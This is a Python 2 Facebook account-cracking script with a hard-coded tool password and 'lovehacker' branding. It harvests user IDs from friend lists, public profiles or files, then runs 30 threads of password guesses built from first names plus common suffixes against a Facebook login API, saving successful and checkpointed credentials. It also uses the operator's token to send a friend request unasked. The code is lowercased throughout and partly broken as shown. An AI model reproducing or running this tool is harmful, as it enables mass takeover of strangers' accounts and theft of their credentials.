import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import threadpool

from requests.exceptions import connectionerror

from mechanize import browser

reload(sys)

sys.setdefaultencoding('utf8')

 

br = mechanize.browser()

br.set_handle_robots(false)

br.set_handle_refresh(mechanize._http.httprefreshprocessor(),max_time=1)

br.addheaders = [('user-agent', 'mozilla/5.0 (linux; android 8.1.0; chrome/79.0.3945.116) applewebkit/537.36 (khtml, like gecko) chrome/79.0.3945.116 mobile safari/537.36')]

br.addheaders = [('user-agent', 'opera/9.80 (android; opera mini/32.0.2254/85. u; id) presto/2.12.423 version/12.16')]

def keluar():

	print "\033[1;96m[!] \x1b[1;91mexit"

	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(00000.1)

##### logo #####

logo = """

   asif javed

   ▄︻̷̿┻̿═━一

   the anonymous lovehacker tricker 

   the legend ℒℴνℯ

   the game changer ℒℴνℯ

   sabir hacker

   ℒℴνℯ ▄︻̷̿┻̿═━一

\033[1;91m=======================================

\033[1;96mauthor  \033[1;93m: \033[1;92msabir

\033[1;96myoutube \033[1;93m: \033[1;92mpakistani hackers

\033[1;96mgithub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love

\033[1;96mblogger \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker

\033[1;91m======================================="""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print logo

		print("\r\033[1;96m \x1b[1;93msedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mnot vuln"

vuln = "\033[32mvuln"

os.system("clear")

print "\033[1;96m ========================================="

print  """\033[1;91m=======================================

\033[1;96mauthor  \033[1;93m: \033[1;92mlove

\033[1;96myoutube \033[1;93m: \033[1;92mlovehacker

\033[1;96mgithub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love

\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker

\033[1;91m======================================="""

print " \x1b[1;93m============================================================="

correctusername = "lovehacker"

correctpassword = "03094161457"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;96m \x1b[1;93musername of tool \x1b[1;96m>>>> ")

    if (username == correctusername):

    	password = raw_input("\033[1;96m \x1b[1;93mpassword of tool \x1b[1;96m>>>> ")

        if (password == correctpassword):

            print "logged in successfully as " + username

            loop = 'false'

        else:

            print "wrong password"

            os.system('xdg-open https://www.facebook.com/anonymoustricker1')

    else:

        print "wrong username"

        os.system('xdg-open https://www.facebook.com/anonymoustricker1')

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (keyerror,ioerror):

		os.system('clear')

		print logo

		print 42*"\033[1;96m="

		print('\033[1;96m\x1b[1;93mlogin with facebook \x1b[1;96m' )

		id = raw_input('\033[1;96m \x1b[1;93mid/email \x1b[1;91m: \x1b[1;92m')

		pwd = raw_input('\033[1;96m \x1b[1;93mpassword \x1b[1;91m: \x1b[1;92m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.urlerror:

			print"\n\033[1;96m \x1b[1;91mthere is no internet connection"

			keluar()

		br._factory.is_html = true

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=jsongenerate_machine_id=1generate_session_cookies=1locale=en_usmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"json", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_us","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\033[1;96m\x1b[1;92mlogin successful'

				os.system('xdg-open https://www.facebook.com/anonymoustricker1')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.connectionerror:

				print"\n\033[1;96m \x1b[1;91mthere is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\033[1;96m \x1b[1;91mit seems that your account has a checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\033[1;96m \x1b[1;91mpassword/email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except ioerror:

		os.system('clear')

		print"\033[1;96m \x1b[1;91mtoken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

	except keyerror:

		os.system('clear')

		print"\033[1;96m \033[1;91mit seems that your account has a checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.connectionerror:

		print"\033[1;96m \x1b[1;91mthere is no internet connection"

		keluar()

	os.system("clear")

	print logo

	print 42*"\033[1;96m="

	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "

	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m id   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "

	print 42*"\033[1;96m="

	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m start cloning with dj"

	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m exit            "

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")

	if unikers =="":

		print "\033[1;96m \x1b[1;91mfill in correctly"

		pilih()

	elif unikers =="1":

		super()

	elif unikers =="0":

		jalan('token removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\033[1;96m \x1b[1;91mfill in correctly"

		pilih()

def super():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except ioerror:

		print"\033[1;96m \x1b[1;91mtoken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print 42*"\033[1;96m="

	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m crack from friend list"

	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m crack from any public id"

	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m crack from file"

	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m back"

	pilih_super()

def pilih_super():

	peak = raw_input("\n\033[1;97m >>> \033[1;97m")

	if peak =="":

		print "\033[1;96m \x1b[1;91mfill in correctly"

		pilih_super()

	elif peak =="1":

		os.system('clear')

		print logo

		print 42*"\033[1;96m="

		jalan('\033[1;96m \033[1;93mgetting id \033[1;97m...')

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)

		z = json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif peak =="2":

		os.system('clear')

		print logo

		print 42*"\033[1;96m="

		idt = raw_input("\033[1;96m \033[1;93menter id \033[1;91m: \033[1;97m")

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mname\033[1;91m :\033[1;97m "+op["name"]

		except keyerror:

			print"\033[1;96m \x1b[1;91mid not found!"

			raw_input("\n\033[1;96m[\033[1;97mback\033[1;96m]")

			super()

		jalan('\033[1;96m \033[1;93mgetting ids \033[1;97m...')

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif peak =="3":

		os.system('clear')

		print logo

		print 42*"\033[1;96m="

		try:

			idlist = raw_input('\x1b[1;96m \x1b[1;93menter file path  \x1b[1;91m: \x1b[1;97m')

			for line in open(idlist,'r').readlines():

				id.append(line.strip())

		except ioerror:

			print '\x1b[1;96m \x1b[1;91mfile not found'

			raw_input('\n\x1b[1;96m[ \x1b[1;97mback \x1b[1;96m]')

			super()

	elif peak =="0":

		menu()

	else:

		print "\033[1;96m \x1b[1;91mfill in correctly"

		pilih_super()

	

	print "\033[1;96m \033[1;93mtotal ids \033[1;91m: \033[1;97m"+str(len(id))

	jalan('\033[1;96m \033[1;93mstarting \033[1;97m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mcracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

	print

	print('\x1b[1;96m \x1b[1;93mto stop process press ctrl then press z')

	print 42*"\033[1;96m="

	

			

	def main(arg):

		global cekpoint,oks

		user = arg

		try:

			os.mkdir('out')

		except oserror:

			pass

		try:

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)

			b = json.loads(a.text)

			pass1 = ('khan123')

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

			q = json.load(data)

			if 'access_token' in q:

				print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1

				oks.append(user+pass1)

			else:

				if 'www.facebook.com' in q["error_msg"]:

					print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m |\x1b[1;97m ' + pass1

					cek = open("out/checkpoint.txt", "a")

					cek.write(user+"|"+pass1+"\n")

					cek.close()

					cekpoint.append(user+pass1)

				else:

					pass2 = b['first_name']+'ali123'

					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

					q = json.load(data)

					if 'access_token' in q:

						print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2

						oks.append(user+pass2)

					else:

						if 'www.facebook.com' in q["error_msg"]:

							print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2

							cek = open("out/checkpoint.txt", "a")

							cek.write(user+"|"+pass2+"\n")

							cek.close()

							cekpoint.append(user+pass2)

						else:

							pass3 = b['first_name'] + '987654'

							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

							q = json.load(data)

							if 'access_token' in q:

								print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3

								oks.append(user+pass3)

							else:

								if 'www.facebook.com' in q["error_msg"]:

									print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3

									cek = open("out/checkpoint.txt", "a")

									cek.write(user+"|"+pass3+"\n")

									cek.close()

									cekpoint.append(user+pass3)

								else:

									pass4 = 'pakistan'

									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

									q = json.load(data)

									if 'access_token' in q:

										print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4

										oks.append(user+pass4)

									else:

										if 'www.facebook.com' in q["error_msg"]:

											print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4

											cek = open("out/checkpoint.txt", "a")

											cek.write(user+"|"+pass4+"\n")

											cek.close()

											cekpoint.append(user+pass4)

										else:

											pass5 = b['first_name'] + 'qwertyuiop'

											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

											q = json.load(data)

											if 'access_token' in q:

												print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5

												oks.append(user+pass5)

											else:

												if 'www.facebook.com' in q["error_msg"]:

													print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5

													cek = open("out/checkpoint.txt", "a")

													cek.write(user+"|"+pass5+"\n")

													cek.close()

													cekpoint.append(user+pass5)

												else:

													pass6 = b['first_name'] + 'hacker123'

													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

													q = json.load(data)

													if 'access_token' in q:

														print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6

														oks.append(user+pass6)

													else:

														if 'www.facebook.com' in q["error_msg"]:

															print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6

															cek = open("out/checkpoint.txt", "a")

															cek.write(user+"|"+pass6+"\n")

															cek.close()

															cekpoint.append(user+pass6)

														else:

															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)

															b = json.loads(a.text)

															pass7 = b['first_name'] + '456456'

															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257c0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_us&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

															q = json.load(data)

															if 'access_token' in q:

																print '\x1b[1;96m[\x1b[1;92msuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7

																oks.append(user+pass7)

															else:

																if 'www.facebook.com' in q["error_msg"]:

																	print '\x1b[1;96m[\x1b[1;93mcheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7

																	cek = open("out/checkpoint.txt", "a")

																	cek.write(user+"|"+pass7+"\n")

																	cek.close()

																	cekpoint.append(user+pass7)

																	

															

		except:

			pass

		

	p = threadpool(30)

	p.map(main, id)

	print 42*"\033[1;96m="

	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mprocess has been completed \033[1;97m....'

	print"\033[1;96m[+] \033[1;92mtotal ok\x1b[1;93mcp \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))

	print("\033[1;96m[+] \033[1;92mcp file has been saved \033[1;91m: \033[1;97mout/checkpoint.txt")

	raw_input("\n\033[1;96m[\033[1;97mback\033[1;96m]")

	menu()

if __name__ == '__main__':

	login()
